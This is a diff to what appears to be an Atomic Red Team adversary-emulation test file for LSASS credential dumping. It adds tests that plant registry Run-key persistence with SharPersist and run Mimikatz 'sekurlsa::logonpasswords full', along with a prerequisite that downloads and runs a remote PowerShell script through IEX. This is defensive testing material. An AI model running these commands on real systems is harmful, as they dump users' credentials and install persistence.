@@ -1,10 +1,37 @@
 attack_technique: T1003.001
 display_name: "Dev Testing!"
 atomic_tests:
-  - name: Josh Super Awesome Dev Test
+  - name: Dev Test - SharPersist - execute_assembly
     auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228069
     description: |
-      this is an epic and awesome description for my dev testing yaml file
+      Execute SharPersist via fork&run with execute_assembly
+    supported_platforms:
+      - windows
+    input_arguments:
+      file:
+        description: Path of the file to be used (if required)
+        type: string
+        default: PathToAtomicsFolder\..\ExternalPayloads\x64\SharPersist.exe
+    dependency_executor_name: powershell
+    dependencies:
+      - description: |
+          File must exist on disk at specified location (#{file})
+        prereq_command: |
+          if (Test-Path "#{file}") {exit 0} else {exit 1}
+        get_prereq_command: |
+          echo "this is a command to get a prerequisite"
+    executor:
+      command: |
+        "#{file}" -t reg -c "cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
+      cleanup_command: |
+        "#{file}" -t reg -k "hkcurun" -v "Test Stuff" -m remove
+      name: execute_assembly
+      elevation_required: true
+
+  - name: Dev Test - SharPersist - inline_assembly
+    auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228069
+    description: |
+      Execute SharPersist inline with inline_assembly
     supported_platforms:
       - windows
     input_arguments:
@@ -26,5 +53,34 @@ atomic_tests:
       cleanup_command: |
         "#{file}" -t reg -k "hkcurun" -v "Test Stuff" -m remove
       name: inline_assembly
-      # name: execute_assembly
+      elevation_required: true
+
+  - name: Dev Test - Mimikatz - execute_pe
+    auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
+    description: |
+      Dump LSASS with mimikatz.exe via execute_pe
+    supported_platforms:
+      - windows
+    input_arguments:
+      mimikatz_exe:
+        description: Path of the Mimikatz binary
+        type: string
+        default: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe
+    dependency_executor_name: powershell
+    dependencies:
+      - description: |
+          Mimikatz must exist on disk at specified location (#{mimikatz_exe})
+        prereq_command: |
+          if (Test-Path "#{mimikatz_exe}") {exit 0} else {exit 1}
+        get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing)
+          $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
+          $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
+          $basePath = Split-Path "#{mimikatz_exe}" | Split-Path
+          Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
+    executor:
+      command: |
+        "#{mimikatz_exe}" "sekurlsa::logonpasswords full" exit
+      name: execute_pe
       elevation_required: true
